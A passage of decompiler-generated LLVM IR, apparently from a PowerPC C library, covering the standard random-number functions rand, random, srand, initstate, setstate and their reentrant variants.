
; uselistorder directives
  uselistorder i32 %v3_1000ca54, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000ca0c, { 1, 0, 2 }
  uselistorder i32 %v0_1000ca44.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1000ca38.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1000c9e8, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1000c9d8, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 4, 10, 5, 6, 1, 7, 8, 9, 11, 0 }
  uselistorder i32 -12, { 3, 4, 2, 5, 0, 1 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000cad0, { 1, 0 }
  uselistorder label %dec_label_pc_1000caa8, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000c9e4, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_1000cae8 = call i32 @random()
  ret i32 %v0_1000cae8

; uselistorder directives
  uselistorder i32 ()* @random, { 6, 3, 5, 0, 1, 4, 2 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1000cb00 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_1002c128.335 to i32), i32* @r29, align 4
  %v4_1000cb18 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 268461856, i32 ptrtoint (i32* @global_var_1002c128.335 to i32))
  %v0_1000cb1c = load i32, i32* @r29, align 4
  store i32 268487460, i32* @lr, align 4
  %v1_1000cb20 = call i32 @pthread_mutex_lock(i32 %v0_1000cb1c)
  %v2_1000cb28 = ptrtoint i32* %stack_var_-56 to i32
  %v3_1000cb30 = call i32 @__GI_random_r(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32 -16064) to i32*), i32 %v2_1000cb28)
  store i32 %v2_1000cb00, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268487488, i32* @lr, align 4
  %v0_1000cb3c = call i32 @__pthread_cleanup_pop_restore()
  %v3_1000cb44 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1000cb44
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002c128.335 to i32), i32* %r29.global-to-local, align 4
  %v2_1000cb7c = ptrtoint i32* %stack_var_-40 to i32
  %v4_1000cb84 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268461856, i32 ptrtoint (i32* @global_var_1002c128.335 to i32))
  store i32 268487568, i32* @lr, align 4
  %v1_1000cb8c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c128.335 to i32))
  store i32 268487592, i32* @lr, align 4
  %v3_1000cba4 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_1002c140)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1000cbac = icmp slt i32 %v3_1000cba4, 0
  store i32 1, i32* @r4, align 4
  store i32 %v2_1000cb7c, i32* @r3, align 4
  br i1 %v1_1000cbac, label %dec_label_pc_1000cbc0, label %dec_label_pc_1000cbbc

dec_label_pc_1000cbbc:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1002c144.339 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000cbc0

dec_label_pc_1000cbc0:                            ; preds = %entry, %dec_label_pc_1000cbbc
  store i32 268487620, i32* @lr, align 4
  %v0_1000cbc0 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1000cbc8 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1000cbc8

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000cbc0, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_1000cbec = ptrtoint i32* %stack_var_-56 to i32
  %v4_1000cc14 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 268461856, i32 ptrtoint (i32* @global_var_1002c128.335 to i32))
  store i32 268487712, i32* @lr, align 4
  %v1_1000cc1c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c128.335 to i32))
  store i32 %arg1, i32* @r3, align 4
  store i32 268487740, i32* @lr, align 4
  %v4_1000cc38 = inttoptr i32 %arg1 to i32*
  %v5_1000cc38 = call i32 @__GI_initstate_r(i32* %v4_1000cc38, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_1002c140 to i32))
  store i32 %v2_1000cbec, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268487752, i32* @lr, align 4
  %v0_1000cc44 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 ptrtoint (i32** @global_var_1002c144.339 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000cc78 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1000cc94 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268461856, i32 ptrtoint (i32* @global_var_1002c128.335 to i32))
  store i32 268487840, i32* @lr, align 4
  %v1_1000cc9c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c128.335 to i32))
  store i32 ptrtoint (i32* @global_var_1002c140 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268487856, i32* @lr, align 4
  %v0_1000ccac = call i32 @srandom_r()
  store i32 %v2_1000cc78, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268487868, i32* @lr, align 4
  %v0_1000ccb8 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 %v0_1000ccb8

; uselistorder directives
  uselistorder i32* @global_var_1002c140, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002c140 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002c128.335 to i32), { 0, 4, 1, 3, 2, 5, 7, 6, 8 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000ccd0 = add i32 %tmp, 12
  %v2_1000ccd0 = inttoptr i32 %v1_1000ccd0 to i32*
  %v3_1000ccd0 = load i32, i32* %v2_1000ccd0, align 4
  store i32 %v3_1000ccd0, i32* %r11.global-to-local, align 4
  %v0_1000ccd4 = load i32, i32* @lr, align 4
  store i32 %v0_1000ccd4, i32* %r0.global-to-local, align 4
  %v1_1000ccdc = add i32 %arg1, 4
  store i32 %v1_1000ccdc, i32* %r3.global-to-local, align 4
  %v3_1000cce0 = icmp eq i32 %v3_1000ccd0, 0
  %v1_1000cce4 = add i32 %tmp, 8
  %v2_1000cce4 = inttoptr i32 %v1_1000cce4 to i32*
  %v3_1000cce4 = load i32, i32* %v2_1000cce4, align 4
  store i32 %v3_1000cce4, i32* %r9.global-to-local, align 4
  br i1 %v3_1000cce0, label %dec_label_pc_1000ccf0, label %dec_label_pc_1000ccf8

dec_label_pc_1000ccf0:                            ; preds = %entry
  %v2_1000ccf0 = add i32 %v3_1000cce4, -4
  %v3_1000ccf0 = inttoptr i32 %v2_1000ccf0 to i32*
  store i32 0, i32* %v3_1000ccf0, align 4
  br label %dec_label_pc_1000cd10

dec_label_pc_1000ccf8:                            ; preds = %entry
  %v1_1000ccf8 = add i32 %tmp, 4
  %v2_1000ccf8 = inttoptr i32 %v1_1000ccf8 to i32*
  %v3_1000ccf8 = load i32, i32* %v2_1000ccf8, align 4
  %v2_1000ccfc = sub i32 %v3_1000ccf8, %v3_1000cce4
  %v4_1000cd00 = sdiv i32 %v2_1000ccfc, 4
  %v1_1000cd04 = mul i32 %v4_1000cd00, 5
  %v2_1000cd08 = add i32 %v1_1000cd04, %v3_1000ccd0
  store i32 %v2_1000cd08, i32* %r0.global-to-local, align 4
  %v2_1000cd0c = add i32 %v3_1000cce4, -4
  %v3_1000cd0c = inttoptr i32 %v2_1000cd0c to i32*
  store i32 %v2_1000cd08, i32* %v3_1000cd0c, align 4
  br label %dec_label_pc_1000cd10

dec_label_pc_1000cd10:                            ; preds = %dec_label_pc_1000ccf0, %dec_label_pc_1000ccf8
  %v0_1000cd10 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000cd10 = add i32 %v0_1000cd10, -4
  %v2_1000cd10 = inttoptr i32 %v1_1000cd10 to i32*
  %v3_1000cd10 = load i32, i32* %v2_1000cd10, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10016c14.340 to i32), i32* %r9.global-to-local, align 4
  %v2_1000cd20 = srem i32 %v3_1000cd10, 5
  store i32 %v2_1000cd20, i32* %r11.global-to-local, align 4
  %v2_1000cd30 = icmp ugt i32 %v2_1000cd20, 4
  %v1_1000cd34 = mul nsw i32 %v2_1000cd20, 4
  store i32 %v1_1000cd34, i32* %r0.global-to-local, align 4
  br i1 %v2_1000cd30, label %dec_label_pc_1000cda0, label %dec_label_pc_1000cd44

dec_label_pc_1000cd44:                            ; preds = %dec_label_pc_1000cd10
  %v2_1000cd3c = add i32 %v1_1000cd34, ptrtoint (i32* @global_var_10016c14.340 to i32)
  %v3_1000cd38 = icmp eq i32 %v2_1000cd20, 0
  %v1_1000cd44 = add i32 %v1_1000cd34, add (i32 ptrtoint (i32* @global_var_10016c14.340 to i32), i32 20)
  %v2_1000cd44 = inttoptr i32 %v1_1000cd44 to i32*
  %v3_1000cd44 = load i32, i32* %v2_1000cd44, align 4
  store i32 %v3_1000cd44, i32* @r10, align 4
  %v3_1000cd48 = inttoptr i32 %v2_1000cd3c to i32*
  %v4_1000cd48 = load i32, i32* %v3_1000cd48, align 4
  store i32 %v4_1000cd48, i32* %r9.global-to-local, align 4
  %v1_1000cd4c = mul i32 %v3_1000cd44, 4
  store i32 %v1_1000cd4c, i32* %r0.global-to-local, align 4
  %v2_1000cd50 = add i32 %tmp, 16
  %v3_1000cd50 = inttoptr i32 %v2_1000cd50 to i32*
  store i32 %v3_1000cd44, i32* %v3_1000cd50, align 4
  %v0_1000cd54 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000cd54 = add i32 %tmp, 20
  %v3_1000cd54 = inttoptr i32 %v2_1000cd54 to i32*
  store i32 %v0_1000cd54, i32* %v3_1000cd54, align 4
  %v0_1000cd58 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000cd58 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000cd58 = add i32 %v1_1000cd58, %v0_1000cd58
  store i32 %v2_1000cd58, i32* @r8, align 4
  %v0_1000cd5c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000cd5c, i32* %v2_1000ccd0, align 4
  br i1 %v3_1000cd38, label %dec_label_pc_1000cd94, label %dec_label_pc_1000cd64

dec_label_pc_1000cd64:                            ; preds = %dec_label_pc_1000cd44
  %v0_1000cd64 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000cd64 = add i32 %v0_1000cd64, -4
  %v2_1000cd64 = inttoptr i32 %v1_1000cd64 to i32*
  %v3_1000cd64 = load i32, i32* %v2_1000cd64, align 4
  %v1_1000cd68 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000cd68 = sdiv i32 %v3_1000cd64, %v1_1000cd68
  %v1_1000cd6c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000cd6c = add i32 %v1_1000cd6c, %v2_1000cd68
  store i32 %v2_1000cd6c, i32* %r9.global-to-local, align 4
  %v1_1000cd70 = mul i32 %v2_1000cd68, 4
  %v1_1000cd74 = load i32, i32* @r10, align 4
  %v2_1000cd74 = sdiv i32 %v2_1000cd6c, %v1_1000cd74
  store i32 %v2_1000cd74, i32* %r11.global-to-local, align 4
  %v2_1000cd78 = add i32 %v1_1000cd70, %v0_1000cd64
  store i32 %v2_1000cd78, i32* %r0.global-to-local, align 4
  %v2_1000cd7c = add i32 %tmp, 4
  %v3_1000cd7c = inttoptr i32 %v2_1000cd7c to i32*
  store i32 %v2_1000cd78, i32* %v3_1000cd7c, align 4
  %v0_1000cd80 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cd80 = load i32, i32* @r10, align 4
  %v2_1000cd80 = mul i32 %v1_1000cd80, %v0_1000cd80
  store i32 %v2_1000cd80, i32* %r11.global-to-local, align 4
  %v1_1000cd84 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000cd84 = sub i32 %v1_1000cd84, %v2_1000cd80
  %v1_1000cd88 = mul i32 %v2_1000cd84, 4
  %v0_1000cd8c = load i32, i32* %r3.global-to-local, align 4
  %v2_1000cd8c = add i32 %v1_1000cd88, %v0_1000cd8c
  store i32 %v2_1000cd8c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000cd8c, i32* %arg2, align 4
  br label %dec_label_pc_1000cd94

dec_label_pc_1000cd94:                            ; preds = %dec_label_pc_1000cd44, %dec_label_pc_1000cd64
  %v0_1000cd94 = load i32, i32* @r8, align 4
  %v2_1000cd94 = add i32 %tmp, 24
  %v3_1000cd94 = inttoptr i32 %v2_1000cd94 to i32*
  store i32 %v0_1000cd94, i32* %v3_1000cd94, align 4
  %v0_1000cd98 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1000cd98, i32* %v2_1000cce4, align 4
  %v0_1000cdb4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000cdb0

dec_label_pc_1000cda0:                            ; preds = %dec_label_pc_1000cd10
  %v0_1000cda0 = call i32 @__errno_location()
  store i32 %v0_1000cda0, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000cda8 = inttoptr i32 %v0_1000cda0 to i32*
  store i32 22, i32* %v2_1000cda8, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000cdb0

dec_label_pc_1000cdb0:                            ; preds = %dec_label_pc_1000cd94, %dec_label_pc_1000cda0
  %v0_1000cdb4 = phi i32 [ %v0_1000cdb4.pre, %dec_label_pc_1000cd94 ], [ -1, %dec_label_pc_1000cda0 ]
  store i32 %v0_1000ccd4, i32* %r0.global-to-local, align 4
  store i32 %v0_1000cdb4, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000cdb4

; uselistorder directives
  uselistorder i32 %v0_1000cdb4, { 1, 0 }
  uselistorder i32 %v3_1000cd44, { 1, 0, 2 }
  uselistorder i32 %v1_1000cd34, { 2, 1, 0 }
  uselistorder i32 %v2_1000cd20, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 6, 0, 5, 4, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_1000cdb0, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd94, { 1, 0 }
  uselistorder label %dec_label_pc_1000cd10, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000cdc4 = add i32 %tmp, 12
  %v2_1000cdc4 = inttoptr i32 %v1_1000cdc4 to i32*
  %v3_1000cdc4 = load i32, i32* %v2_1000cdc4, align 4
  %v1_1000cdd0 = add i32 %tmp, 8
  %v2_1000cdd0 = inttoptr i32 %v1_1000cdd0 to i32*
  %v3_1000cdd0 = load i32, i32* %v2_1000cdd0, align 4
  store i32 %v3_1000cdd0, i32* %r7.global-to-local, align 4
  %v3_1000cdd4 = icmp eq i32 %v3_1000cdc4, 0
  br i1 %v3_1000cdd4, label %dec_label_pc_1000cddc, label %dec_label_pc_1000cdf8

dec_label_pc_1000cddc:                            ; preds = %entry
  %v1_1000cddc = inttoptr i32 %v3_1000cdd0 to i32*
  %v2_1000cddc = load i32, i32* %v1_1000cddc, align 4
  %v2_1000cde0 = mul i32 %v2_1000cddc, 1103515245
  %v1_1000cde4 = add i32 %v2_1000cde0, 12345
  %v1_1000cde8 = urem i32 %v1_1000cde4, -2147483648
  store i32 %v1_1000cde8, i32* %r9.global-to-local, align 4
  store i32 %v1_1000cde8, i32* %v1_1000cddc, align 4
  %v0_1000cdf0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000cdf0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000cdf0, i32* %v2_1000cdf0, align 4
  br label %dec_label_pc_1000ce4c

dec_label_pc_1000cdf8:                            ; preds = %entry
  %v2_1000cdf8 = load i32, i32* %arg1, align 4
  %v1_1000cdfc = add i32 %tmp, 4
  %v2_1000cdfc = inttoptr i32 %v1_1000cdfc to i32*
  %v3_1000cdfc = load i32, i32* %v2_1000cdfc, align 4
  store i32 %v3_1000cdfc, i32* %r9.global-to-local, align 4
  %v1_1000ce00 = add i32 %tmp, 24
  %v2_1000ce00 = inttoptr i32 %v1_1000ce00 to i32*
  %v3_1000ce00 = load i32, i32* %v2_1000ce00, align 4
  %v1_1000ce04 = add i32 %v2_1000cdf8, 4
  store i32 %v1_1000ce04, i32* @r8, align 4
  %v1_1000ce08 = add i32 %v3_1000cdfc, 4
  %v1_1000ce0c = inttoptr i32 %v3_1000cdfc to i32*
  %v2_1000ce0c = load i32, i32* %v1_1000ce0c, align 4
  store i32 %v2_1000ce0c, i32* %r9.global-to-local, align 4
  %v2_1000ce10 = icmp ult i32 %v1_1000ce04, %v3_1000ce00
  %v1_1000ce18 = inttoptr i32 %v2_1000cdf8 to i32*
  %v2_1000ce18 = load i32, i32* %v1_1000ce18, align 4
  store i32 %v1_1000ce08, i32* @r10, align 4
  %v2_1000ce20 = add i32 %v2_1000ce18, %v2_1000ce0c
  %v1_1000ce24 = udiv i32 %v2_1000ce20, 2
  store i32 %v1_1000ce24, i32* %r9.global-to-local, align 4
  store i32 %v2_1000ce20, i32* %v1_1000ce18, align 4
  %v0_1000ce2c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000ce2c = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000ce2c, i32* %v2_1000ce2c, align 4
  br i1 %v2_1000ce10, label %dec_label_pc_1000ce3c, label %dec_label_pc_1000ce34

dec_label_pc_1000ce34:                            ; preds = %dec_label_pc_1000cdf8
  %v0_1000ce34 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000ce34, i32* @r8, align 4
  br label %dec_label_pc_1000ce44

dec_label_pc_1000ce3c:                            ; preds = %dec_label_pc_1000cdf8
  %v2_1000ce14 = icmp ult i32 %v1_1000ce08, %v3_1000ce00
  br i1 %v2_1000ce14, label %dec_label_pc_1000ce44, label %dec_label_pc_1000ce40

dec_label_pc_1000ce40:                            ; preds = %dec_label_pc_1000ce3c
  %v0_1000ce40 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000ce40, i32* @r10, align 4
  br label %dec_label_pc_1000ce44

dec_label_pc_1000ce44:                            ; preds = %dec_label_pc_1000ce3c, %dec_label_pc_1000ce34, %dec_label_pc_1000ce40
  %v0_1000ce44 = load i32, i32* @r10, align 4
  store i32 %v0_1000ce44, i32* %v2_1000cdfc, align 4
  %v0_1000ce48 = load i32, i32* @r8, align 4
  store i32 %v0_1000ce48, i32* %arg1, align 4
  br label %dec_label_pc_1000ce4c

dec_label_pc_1000ce4c:                            ; preds = %dec_label_pc_1000cddc, %dec_label_pc_1000ce44
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000ce20, { 1, 0 }
  uselistorder i32 %v1_1000ce08, { 1, 0 }
  uselistorder i32 %v3_1000cdfc, { 1, 0, 2 }
  uselistorder i32 %v1_1000cde8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1000ce4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce44, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000ce54 = load i32, i32* @lr, align 4
  %v0_1000ce60 = load i32, i32* @r4, align 4
  store i32 %v0_1000ce60, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1000ce6c = add i32 %v0_1000ce60, 12
  %v2_1000ce6c = inttoptr i32 %v1_1000ce6c to i32*
  %v3_1000ce6c = load i32, i32* %v2_1000ce6c, align 4
  %v2_1000ce70 = icmp ugt i32 %v3_1000ce6c, 4
  br i1 %v2_1000ce70, label %dec_label_pc_1000cf20, label %dec_label_pc_1000ce78

dec_label_pc_1000ce78:                            ; preds = %entry
  %v0_1000ce78 = load i32, i32* @r3, align 4
  %v3_1000ce78 = icmp eq i32 %v0_1000ce78, 0
  %v1_1000ce7c = add i32 %v0_1000ce60, 8
  %v2_1000ce7c = inttoptr i32 %v1_1000ce7c to i32*
  %v3_1000ce7c = load i32, i32* %v2_1000ce7c, align 4
  store i32 %v3_1000ce7c, i32* @r10, align 4
  br i1 %v3_1000ce78, label %dec_label_pc_1000ce84, label %dec_label_pc_1000ce88

dec_label_pc_1000ce84:                            ; preds = %dec_label_pc_1000ce78
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_1000ce88

dec_label_pc_1000ce88:                            ; preds = %dec_label_pc_1000ce78, %dec_label_pc_1000ce84
  %v0_1000ce8c = phi i32 [ %v0_1000ce78, %dec_label_pc_1000ce78 ], [ 1, %dec_label_pc_1000ce84 ]
  %v3_1000ce88 = icmp eq i32 %v3_1000ce6c, 0
  %v2_1000ce8c = inttoptr i32 %v3_1000ce7c to i32*
  store i32 %v0_1000ce8c, i32* %v2_1000ce8c, align 4
  br i1 %v3_1000ce88, label %dec_label_pc_1000cf1c, label %dec_label_pc_1000ce94

dec_label_pc_1000ce94:                            ; preds = %dec_label_pc_1000ce88
  %v0_1000ce94 = load i32, i32* @r30, align 4
  %v1_1000ce94 = add i32 %v0_1000ce94, 16
  %v2_1000ce94 = inttoptr i32 %v1_1000ce94 to i32*
  %v3_1000ce94 = load i32, i32* %v2_1000ce94, align 4
  store i32 %v3_1000ce94, i32* %r11.global-to-local, align 4
  store i32 127773, i32* @r8, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_1000ceac = load i32, i32* @r10, align 4
  store i32 %v3_1000ce94, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_1000ce94, 0
  br i1 %tmp18, label %dec_label_pc_1000cee8.preheader, label %dec_label_pc_1000cee8.preheader.thread

dec_label_pc_1000cee8.preheader.thread:           ; preds = %dec_label_pc_1000ce94
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000ceec

dec_label_pc_1000cee8.preheader:                  ; preds = %dec_label_pc_1000ce94
  %v1_1000cee82 = add i32 %v3_1000ce94, -1
  store i32 %v1_1000cee82, i32* %ctr.global-to-local, align 4
  %v2_1000cee83 = icmp eq i32 %v1_1000cee82, 0
  br i1 %v2_1000cee83, label %dec_label_pc_1000ceec, label %dec_label_pc_1000cec4

dec_label_pc_1000cec4:                            ; preds = %dec_label_pc_1000cee8.preheader, %dec_label_pc_1000cee4.dec_label_pc_1000cec4_crit_edge
  %v1_1000cee4 = phi i32 [ %v2_1000cee4, %dec_label_pc_1000cee4.dec_label_pc_1000cec4_crit_edge ], [ %v0_1000ceac, %dec_label_pc_1000cee8.preheader ]
  %v1_1000cec4 = phi i32 [ %v1_1000cec4.pre, %dec_label_pc_1000cee4.dec_label_pc_1000cec4_crit_edge ], [ 127773, %dec_label_pc_1000cee8.preheader ]
  %v0_1000cec4 = load i32, i32* @r3, align 4
  %v2_1000cec4 = sdiv i32 %v0_1000cec4, %v1_1000cec4
  %v2_1000cec8 = mul i32 %v2_1000cec4, %v1_1000cec4
  %v2_1000cecc = sub i32 %v0_1000cec4, %v2_1000cec8
  %v1_1000ced0 = mul i32 %v2_1000cec4, 2836
  store i32 %v1_1000ced0, i32* %r0.global-to-local, align 4
  %v1_1000ced4 = mul i32 %v2_1000cecc, 16807
  %v2_1000ced8 = sub i32 %v1_1000ced4, %v1_1000ced0
  store i32 %v2_1000ced8, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1000ced8, -1
  br i1 %tmp19, label %dec_label_pc_1000cee4, label %dec_label_pc_1000cee0

dec_label_pc_1000cee0:                            ; preds = %dec_label_pc_1000cec4
  %v1_1000cee0 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000cee0 = add i32 %v1_1000cee0, %v2_1000ced8
  store i32 %v2_1000cee0, i32* @r3, align 4
  br label %dec_label_pc_1000cee4

dec_label_pc_1000cee4:                            ; preds = %dec_label_pc_1000cec4, %dec_label_pc_1000cee0
  %v0_1000cee4 = phi i32 [ %v2_1000ced8, %dec_label_pc_1000cec4 ], [ %v2_1000cee0, %dec_label_pc_1000cee0 ]
  %v2_1000cee4 = add i32 %v1_1000cee4, 4
  %v3_1000cee4 = inttoptr i32 %v2_1000cee4 to i32*
  store i32 %v0_1000cee4, i32* %v3_1000cee4, align 4
  %v0_1000cee8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000cee8 = add i32 %v0_1000cee8, -1
  store i32 %v1_1000cee8, i32* %ctr.global-to-local, align 4
  %v2_1000cee8 = icmp eq i32 %v1_1000cee8, 0
  br i1 %v2_1000cee8, label %dec_label_pc_1000cee8.dec_label_pc_1000ceec_crit_edge, label %dec_label_pc_1000cee4.dec_label_pc_1000cec4_crit_edge

dec_label_pc_1000cee4.dec_label_pc_1000cec4_crit_edge: ; preds = %dec_label_pc_1000cee4
  %v1_1000cec4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000cec4

dec_label_pc_1000cee8.dec_label_pc_1000ceec_crit_edge: ; preds = %dec_label_pc_1000cee4
  %v0_1000ceec.pre = load i32, i32* @r30, align 4
  %v0_1000cef0.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1000cef4.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_1000ceec

dec_label_pc_1000ceec:                            ; preds = %dec_label_pc_1000cee8.preheader.thread, %dec_label_pc_1000cee8.dec_label_pc_1000ceec_crit_edge, %dec_label_pc_1000cee8.preheader
  %v0_1000cef4 = phi i32 [ %v0_1000cef4.pre, %dec_label_pc_1000cee8.dec_label_pc_1000ceec_crit_edge ], [ %v0_1000ceac, %dec_label_pc_1000cee8.preheader ], [ %v0_1000ceac, %dec_label_pc_1000cee8.preheader.thread ]
  %v0_1000cef0 = phi i32 [ %v0_1000cef0.pre, %dec_label_pc_1000cee8.dec_label_pc_1000ceec_crit_edge ], [ %v3_1000ce94, %dec_label_pc_1000cee8.preheader ], [ %v3_1000ce94, %dec_label_pc_1000cee8.preheader.thread ]
  %v1_1000cef4 = phi i32 [ %v0_1000ceec.pre, %dec_label_pc_1000cee8.dec_label_pc_1000ceec_crit_edge ], [ %v0_1000ce94, %dec_label_pc_1000cee8.preheader ], [ %v0_1000ce94, %dec_label_pc_1000cee8.preheader.thread ]
  %v1_1000ceec = add i32 %v1_1000cef4, 20
  %v2_1000ceec = inttoptr i32 %v1_1000ceec to i32*
  %v3_1000ceec = load i32, i32* %v2_1000ceec, align 4
  store i32 %v3_1000ceec, i32* %r0.global-to-local, align 4
  %v1_1000cef0 = mul i32 %v0_1000cef0, 10
  store i32 %v1_1000cef0, i32* %r31.global-to-local, align 4
  %v2_1000cef4 = add i32 %v1_1000cef4, 4
  %v3_1000cef4 = inttoptr i32 %v2_1000cef4 to i32*
  store i32 %v0_1000cef4, i32* %v3_1000cef4, align 4
  %v0_1000cef8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cef8 = mul i32 %v0_1000cef8, 4
  %v0_1000cefc = load i32, i32* @r10, align 4
  %v2_1000cefc = add i32 %v0_1000cefc, %v1_1000cef8
  store i32 %v2_1000cefc, i32* %r0.global-to-local, align 4
  %v1_1000cf00 = load i32, i32* @r30, align 4
  %v2_1000cf00 = inttoptr i32 %v1_1000cf00 to i32*
  store i32 %v2_1000cefc, i32* %v2_1000cf00, align 4
  %v2_1000cf14 = ptrtoint i32* %stack_var_-24 to i32
  %v0_1000cf0c21 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000cf0c22 = add i32 %v0_1000cf0c21, -1
  store i32 %v1_1000cf0c22, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1000cf0c22, -1
  br i1 %tmp2025, label %dec_label_pc_1000cf08, label %dec_label_pc_1000cf1c

dec_label_pc_1000cf08:                            ; preds = %dec_label_pc_1000ceec, %dec_label_pc_1000cf08
  %v0_1000cf1026 = load i32, i32* @r30, align 4
